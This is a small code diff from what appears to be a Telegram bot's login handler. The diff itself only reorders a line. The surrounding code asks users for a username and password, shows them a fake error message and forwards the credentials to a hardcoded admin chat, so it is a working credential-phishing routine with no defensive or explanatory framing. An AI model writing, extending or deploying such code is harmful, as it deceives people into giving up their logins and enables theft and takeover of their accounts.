@@ -28,8 +28,8 @@ async def login(message: Message):
     args = message.text.split()
     if len(args) >= 2:
         username = args[1]
-        log = open('users.txt', 'a')
         password = args[2]
+        log = open('users.txt', 'a')
         await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
         admin_id = '1621436440'
         await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
